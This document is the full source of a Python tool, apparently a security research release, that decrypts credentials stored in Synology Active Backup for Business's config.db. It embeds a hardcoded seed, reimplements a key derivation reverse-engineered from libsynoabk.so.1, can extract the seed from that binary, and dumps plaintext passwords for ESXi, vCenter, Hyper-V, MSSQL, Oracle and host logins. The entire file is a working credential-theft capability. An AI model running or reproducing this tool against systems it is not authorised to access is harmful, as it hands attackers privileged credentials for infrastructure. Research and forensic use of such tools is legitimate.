#!/usr/bin/env python3
"""Synology-ActiveBackup-Inventory-Credential-Decryptor.

Decrypt credentials stored in config.db (SQLite) of Synology Active Backup
for Business. The encryption scheme is reverse-engineered from libsynoabk.so.1.

Usage:
    python decrypt.py [--so PATH | --seed HEX] [--table {inventory,device,all}]
                      [--format {table,json,csv}] config.db
"""

from __future__ import annotations

import argparse
import base64
import csv
import hashlib
import io
import json
import re
import sqlite3
import sys
from pathlib import Path

__version__ = "1.0.0"

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

DEFAULT_SEED: bytes = b"5fed151ed24021f9fd689f18c7b0434c"

AES_KEY_LEN = 32
AES_IV_LEN = 16
AES_BLOCK_SIZE = 16
SBOX_SIZE = 256

HOST_TYPES: dict[int, str] = {
    1: "ESXi",
    2: "vCenter",
    3: "Hyper-V",
    4: "SCVMM",
    5: "FailoverCluster",
}

BACKUP_TYPES: dict[int, str] = {
    1: "VM",
    2: "Physical Server",
    3: "File Server",
    4: "DSM",
}

# ---------------------------------------------------------------------------
# Crypto — AES-256-CBC decryption chain
# ---------------------------------------------------------------------------


def transform_seed(seed: bytes) -> bytes:
    """Apply the custom substitution cipher (modified RC4-KSA variant) to the seed.

    Reverse-engineered from libsynoabk.so.1 function at ~0x187830.
    """
    seed_len = len(seed)
    sbox = list(range(SBOX_SIZE))
    ubox = [0] * SBOX_SIZE

    acc = 0x245
    for i in range(SBOX_SIZE - 1, -1, -1):
        key_byte = seed[(SBOX_SIZE - 1 - i) % seed_len]
        acc += key_byte - SBOX_SIZE if key_byte > 127 else key_byte
        target = acc & 0xFF
        ubox[i] = target
        ubox[target] = i
        sbox[i], sbox[target] = sbox[target], sbox[i]

    tbox = [0] * SBOX_SIZE
    for idx in range(SBOX_SIZE):
        tbox[sbox[idx]] = idx

    output = bytearray(seed_len)
    offset_d, offset_s = 0, 0
    for pos in range(seed_len):
        val = (seed[pos] + offset_d) & 0xFF
        mixed = (sbox[val] + offset_s) & 0xFF
        uval = ubox[mixed]
        adjusted = ((uval - SBOX_SIZE if uval > 127 else uval) - offset_s) & 0xFF
        tval = tbox[adjusted]
        output[pos] = ((tval - SBOX_SIZE if tval > 127 else tval) - offset_d) & 0xFF
        offset_d += 1
        if offset_d == SBOX_SIZE:
            offset_s += 1
            offset_d = 0
            if offset_s == SBOX_SIZE:
                offset_s = 0

    return bytes(output)


def derive_passphrase(seed: bytes = DEFAULT_SEED) -> bytes:
    """Derive the AES passphrase from a seed via transform + base64."""
    return base64.b64encode(transform_seed(seed))


def _evp_bytes_to_key(
    passphrase: bytes,
    key_len: int = AES_KEY_LEN,
    iv_len: int = AES_IV_LEN,
) -> tuple[bytes, bytes]:
    """Replicate OpenSSL EVP_BytesToKey with MD5, no salt, count=1."""
    derived = b""
    block = b""
    while len(derived) < key_len + iv_len:
        block = hashlib.md5(block + passphrase).digest()
        derived += block
    return derived[:key_len], derived[key_len : key_len + iv_len]


def decrypt_password(encrypted_b64: str, seed: bytes = DEFAULT_SEED) -> str:
    """Decrypt a base64-encoded AES-256-CBC ciphertext stored by Active Backup."""
    if not encrypted_b64:
        return ""

    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    passphrase = derive_passphrase(seed)
    key, iv = _evp_bytes_to_key(passphrase)
    ciphertext = base64.b64decode(encrypted_b64)

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()

    pad_len = padded[-1]
    if pad_len < 1 or pad_len > AES_BLOCK_SIZE or not all(b == pad_len for b in padded[-pad_len:]):
        raise ValueError(f"Invalid PKCS#7 padding (pad byte = {pad_len})")

    return padded[:-pad_len].decode("utf-8")


# ---------------------------------------------------------------------------
# Seed extractor — auto-extract from libsynoabk.so.1
# ---------------------------------------------------------------------------

_ANCHOR = b"Allocate cipher failed"
_SEARCH_WINDOW = 2048
_MIN_UNIQUE_CHARS = 8


def extract_seed(so_path: str) -> bytes | None:
    """Extract the hardcoded encryption seed from a libsynoabk.so binary."""
    data = Path(so_path).read_bytes()

    anchor_pos = data.find(_ANCHOR)
    if anchor_pos == -1:
        return None

    region = data[anchor_pos : anchor_pos + _SEARCH_WINDOW]
    for match in re.finditer(rb"\x00([0-9a-f]{32})\x00", region):
        candidate = match.group(1)
        if len(set(candidate)) >= _MIN_UNIQUE_CHARS:
            return candidate

    return None


# ---------------------------------------------------------------------------
# Database — read credentials from config.db
# ---------------------------------------------------------------------------


def has_table(db_path: str, table_name: str) -> bool:
    """Check whether a table exists in the SQLite database."""
    with sqlite3.connect(db_path) as conn:
        row = conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND name=?",
            (table_name,),
        ).fetchone()
    return row is not None


def read_inventory(db_path: str, seed: bytes) -> list[dict]:
    """Read hypervisor credentials from inventory_table."""
    with sqlite3.connect(db_path) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute(
            "SELECT inventory_id, host_type, host_name, host_addr, "
            "port_webapi, auth_user, auth_password, protocol "
            "FROM inventory_table"
        ).fetchall()

    return [
        {
            "id": r["inventory_id"],
            "type": HOST_TYPES.get(r["host_type"], f"Unknown({r['host_type']})"),
            "host_name": r["host_name"],
            "host_addr": r["host_addr"],
            "port": r["port_webapi"],
            "username": r["auth_user"],
            "password": decrypt_password(r["auth_password"], seed),
            "protocol": r["protocol"],
        }
        for r in rows
    ]


def read_devices(db_path: str, seed: bytes) -> list[dict]:
    """Read device credentials from device_table."""
    with sqlite3.connect(db_path) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute(
            "SELECT device_id, backup_type, host_name, host_ip, host_port, os_name, "
            "login_user, login_password, mssql_user, mssql_password, "
            "oracle_user, oracle_password "
            "FROM device_table"
        ).fetchall()

    results = []
    for r in rows:
        creds: dict[str, dict[str, str]] = {}
        for cred_type, user_col, pass_col in (
            ("login", "login_user", "login_password"),
            ("mssql", "mssql_user", "mssql_password"),
            ("oracle", "oracle_user", "oracle_password"),
        ):
            if r[pass_col]:
                creds[cred_type] = {
                    "username": r[user_col],
                    "password": decrypt_password(r[pass_col], seed),
                }

        results.append({
            "id": r["device_id"],
            "type": BACKUP_TYPES.get(r["backup_type"], f"Unknown({r['backup_type']})"),
            "host_name": r["host_name"],
            "host_ip": r["host_ip"],
            "port": r["host_port"],
            "os": r["os_name"],
            "credentials": creds,
        })

    return results


# ---------------------------------------------------------------------------
# CLI — output formatting and argument parsing
# ---------------------------------------------------------------------------


def _print_inventory_table(records: list[dict]) -> None:
    if not records:
        print("  (no records)")
        return

    header = f"{'ID':<4} {'Type':<10} {'Host':<25} {'Address':<18} {'Port':<6} {'User':<10} {'Password'}"
    print(header)
    print("-" * len(header))
    for rec in records:
        print(
            f"{rec['id']:<4} {rec['type']:<10} {rec['host_name']:<25} "
            f"{rec['host_addr']:<18} {rec['port']:<6} {rec['username']:<10} {rec['password']}"
        )


def _print_device_table(records: list[dict]) -> None:
    if not records:
        print("  (no records)")
        return

    with_creds = [r for r in records if r["credentials"]]
    if not with_creds:
        print(f"  ({len(records)} devices, none with stored credentials)")
        return

    header = f"{'ID':<4} {'Type':<16} {'Host':<25} {'IP':<18} {'Cred Type':<12} {'User':<16} {'Password'}"
    print(header)
    print("-" * len(header))
    for rec in with_creds:
        first_line = True
        for cred_type, cred in rec["credentials"].items():
            prefix = (
                f"{rec['id']:<4} {rec['type']:<16} {rec['host_name']:<25} {rec['host_ip']:<18} "
                if first_line
                else " " * 63
            )
            print(f"{prefix}{cred_type:<12} {cred['username']:<16} {cred['password']}")
            first_line = False


def _output_json(inventory: list[dict], devices: list[dict]) -> None:
    payload = json.dumps(
        {"inventory": inventory, "devices": devices},
        indent=2,
        ensure_ascii=False,
    )
    sys.stdout.buffer.write(payload.encode("utf-8") + b"\n")


def _output_csv(inventory: list[dict], devices: list[dict]) -> None:
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(["source", "id", "type", "host", "address", "port", "username", "password"])

    for rec in inventory:
        writer.writerow([
            "inventory", rec["id"], rec["type"], rec["host_name"],
            rec["host_addr"], rec["port"], rec["username"], rec["password"],
        ])
    for rec in devices:
        for cred_type, cred in rec["credentials"].items():
            writer.writerow([
                "device", rec["id"], f"{rec['type']}:{cred_type}", rec["host_name"],
                rec["host_ip"], rec["port"], cred["username"], cred["password"],
            ])

    print(buf.getvalue(), end="")


def _resolve_seed(args: argparse.Namespace) -> bytes:
    if args.seed:
        return args.seed.encode()

    if args.so:
        extracted = extract_seed(args.so)
        if extracted:
            print(f"[*] Extracted seed from {args.so}: {extracted.decode()}", file=sys.stderr)
            return extracted
        print(f"[!] Could not extract seed from {args.so}, using default", file=sys.stderr)

    return DEFAULT_SEED


def main() -> None:
    parser = argparse.ArgumentParser(
        prog="decrypt",
        description="Synology-ActiveBackup-Inventory-Credential-Decryptor: Decrypt credentials from config.db",
    )
    parser.add_argument("db", help="Path to config.db")
    parser.add_argument("--so", metavar="PATH", help="Path to libsynoabk.so.1 (auto-extract seed)")
    parser.add_argument("--seed", metavar="HEX", help="Override the 32-char hex seed directly")
    parser.add_argument("--table", choices=["inventory", "device", "all"], default="all")
    parser.add_argument("--format", choices=["table", "json", "csv"], default="table", dest="fmt")
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    args = parser.parse_args()

    seed = _resolve_seed(args)

    show_inventory = args.table in ("inventory", "all")
    show_devices = args.table in ("device", "all")

    inventory = read_inventory(args.db, seed) if show_inventory and has_table(args.db, "inventory_table") else []
    devices = read_devices(args.db, seed) if show_devices and has_table(args.db, "device_table") else []

    if args.fmt == "json":
        _output_json(inventory, devices)
    elif args.fmt == "csv":
        _output_csv(inventory, devices)
    else:
        if inventory:
            print("\n=== Inventory (Hypervisors) ===\n")
            _print_inventory_table(inventory)
        if devices:
            print("\n=== Devices ===\n")
            _print_device_table(devices)
        if not inventory and not devices:
            print("No credential data found.")


if __name__ == "__main__":
    main()
